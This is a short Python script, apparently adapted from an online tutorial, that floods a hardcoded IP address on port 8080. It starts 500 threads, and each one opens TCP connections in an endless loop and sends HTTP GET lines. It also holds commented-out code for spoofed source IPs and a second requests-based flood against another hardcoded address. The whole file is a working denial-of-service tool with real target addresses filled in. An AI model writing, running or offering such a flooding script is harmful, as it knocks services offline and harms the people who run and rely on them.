
#This code is heavily based off of https://www.neuralnine.com/code-a-ddos-script-in-python/
import socket
import threading
import random

target = '131.229.238.255'
port = 8080


def attack():
    while True:
        # fake_ip = str(random.randint(0, 999)) + '.' + str(random.randint(0, 999)) + '.' + str(random.randint(0, 999)) + '.' + str(random.randint(0, 999))
        # print("fake ip = " + fake_ip)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        # s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

# import requests
# import threading
#
# target = 'http://131.229.234.5:8080/test.html'
#
#
# def attack():
#     while True:
#         requests.get(target)
#
#
# for i in range(500):
#     thread = threading.Thread(target=attack)
#     thread.start()
#
